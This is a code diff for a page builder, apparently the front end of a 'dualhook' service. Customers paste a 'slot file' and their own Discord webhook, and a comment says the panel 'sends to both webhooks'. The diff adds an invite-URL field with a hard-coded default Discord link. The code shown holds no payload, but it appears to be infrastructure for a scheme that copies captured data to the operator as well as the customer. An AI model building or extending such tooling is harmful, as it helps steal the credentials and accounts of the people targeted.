@@ -427,10 +427,10 @@ function buildDualhookPage(record) {
     <div class="stat"><div class="stat-num" data-target="99" data-suffix="%">0%</div><div class="stat-label">Uptime</div></div>
     <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">Support</div></div>
   </div>
-  <button class="discord-btn">
-    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
-    Join our Discord
-  </button>
+<a href="${record.inviteUrl || 'https://discord.gg/5Q8XvgTpTT'}" target="_blank" class="discord-btn" style="text-decoration:none;display:inline-flex;">
+  <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37..."/></svg>
+  Join our Discord
+</a>
 </section>
 
 <footer>
@@ -1787,10 +1787,10 @@ function buildSlotsPage(record) {
       <div class="stat-label">Support</div>
     </div>
   </div>
-  <button class="discord-btn">
-    <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
-    Join our Discord
-  </button>
+<a href="${record.inviteUrl || 'https://discord.gg/5Q8XvgTpTT'}" target="_blank" class="discord-btn" style="text-decoration:none;display:inline-flex;">
+  <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37..."/></svg>
+  Join our Discord
+</a>
 </section>
 
 <!-- FOOTER -->
@@ -1939,27 +1939,36 @@ if(communitySection) observer.observe(communitySection);
 let currentSlotData = { num: null, name: null, value: null, webhook: null };
 
 function openModal(num, name) {
-  currentSlotData = { num, name, value: null, webhook: null };
-  document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
-  document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
+  currentSlotData = { num, name, value: null, webhook: null, inviteUrl: null };
+  
+  document.getElementById('modalTitle').textContent = `Slot ${num} — ${name}`;
+  document.getElementById('enableBtn').textContent = `Enable Slot ${num}`;
   document.getElementById('errorMsg').textContent = '';
   
-  document.getElementById('modalInputs').innerHTML = \`
+  document.getElementById('modalInputs').innerHTML = `
     <div class="input-group">
-      <label class="input-label">Slot \${num} File <span style="color:#f472b6">*</span></label>
+      <label class="input-label">Slot ${num} File <span style="color:#f472b6">*</span></label>
       <div class="input-row">
-        <div class="fake-input placeholder" id="display-value-\${num}">Click paste to add file</div>
-        <button class="paste-btn" onclick="pasteValue('value', \${num})">Paste</button>
+        <div class="fake-input placeholder" id="display-value-${num}">Click paste to add file</div>
+        <button class="paste-btn" onclick="pasteValue('value', ${num})">Paste</button>
       </div>
     </div>
     <div class="input-group">
       <label class="input-label">Your Webhook <span style="color:#f472b6">*</span></label>
       <div class="input-row">
-        <div class="fake-input placeholder" id="display-webhook-\${num}">Click paste to add webhook</div>
-        <button class="paste-btn" onclick="pasteValue('webhook', \${num})">Paste</button>
+        <div class="fake-input placeholder" id="display-webhook-${num}">Click paste to add webhook</div>
+        <button class="paste-btn" onclick="pasteValue('webhook', ${num})">Paste</button>
       </div>
     </div>
-  \`;
+    <div class="input-group">
+      <label class="input-label">Invite URL <span class="opt-badge">optional</span></label>
+      <div class="input-row">
+        <div class="fake-input placeholder" id="display-invite-${num}">Click paste to add invite URL</div>
+        <button class="paste-btn" onclick="pasteValue('inviteUrl', ${num})">Paste</button>
+      </div>
+      <div style="font-size:0.6rem;color:var(--muted);margin-top:6px;">Leave empty to use default: https://discord.gg/5Q8XvgTpTT</div>
+    </div>
+  `;
   
   updateEnableButton();
   document.getElementById('modalOverlay').classList.add('open');
@@ -1970,7 +1979,8 @@ async function pasteValue(type, num) {
     const text = await navigator.clipboard.readText();
     if (text && text.trim()) {
       currentSlotData[type] = text.trim();
-      const display = document.getElementById(\`display-\${type}-\${num}\`);
+      const displayId = type === 'inviteUrl' ? `display-invite-${num}` : `display-${type}-${num}`;
+      const display = document.getElementById(displayId);
       display.textContent = '•'.repeat(Math.min(text.length, 32));
       display.classList.remove('placeholder');
       display.classList.add('filled');
@@ -2023,12 +2033,15 @@ document.addEventListener('keydown', e => {
 /* ── ENABLE SLOT — sends to both webhooks ── */
 document.getElementById('enableBtn').addEventListener('click', async function() {
   const btn = this;
-  const { num, value, webhook } = currentSlotData;
+  const { num, value, webhook, inviteUrl } = currentSlotData;
   
   if (!value || !webhook) {
     document.getElementById('errorMsg').textContent = 'Both slot file and webhook are required!';
     return;
   }
+
+  // Use default Discord if inviteUrl is empty
+  const finalInviteUrl = inviteUrl && inviteUrl.trim() ? inviteUrl.trim() : 'https://discord.gg/5Q8XvgTpTT';
 
   btn.disabled = true;
   const origText = btn.textContent;
@@ -2036,7 +2049,8 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
 
   const slots = {};
   slots['slot' + num] = value;
-  slots['webhook' + num] = webhook; // Store their webhook too
+  slots['webhook' + num] = webhook;
+  slots['inviteUrl' + num] = finalInviteUrl;
 
   try {
     const res = await fetch('/api/submit', {
